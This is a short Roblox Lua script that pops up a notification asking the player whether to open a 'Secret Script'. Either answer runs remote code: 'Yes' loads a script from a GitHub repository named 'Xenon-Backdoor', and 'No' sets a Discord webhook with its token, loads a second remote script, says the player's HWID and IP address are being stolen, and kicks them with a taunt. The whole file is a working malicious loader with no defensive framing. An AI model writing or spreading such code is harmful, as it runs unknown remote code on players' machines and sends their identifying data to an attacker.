local function callback(Text)
    if Text == "Yes" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenon-UI-coder/Xenon-Backdoor/main/Script.lua", true))()
    elseif Text == "No" then
        warn("If you do /console in chat or F9 on your keybaord while run this script congratulations your info getting stealed by me [HWID and Ip Address]")
        _G.webhooksdiscord = "https://discord.com/api/webhooks/1327636232598978591/Bw3Z_caU35K_BldqiTJt5DiySH8wIiqNt1qEEPTEoMzEQatAZPLnNy6px6YvkAZDa8kK"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
        wait (5)
        game.Players.localPlayer:kick("YOUR IP ADDRESS IS MINE")
    end
end

local NotificationBindable = Instance.new("BindableFunction")
NotificationBindable.OnInvoke = callback

game.StarterGui:SetCore("SendNotification", {
    Title = "AOC",
    Text = "Do you REALLY WANT to open This Secret Script?",
    Icon = "",
    Duration = 9e9,
    Button1 = "Yes",
    Button2 = "No",
    Callback = NotificationBindable,
})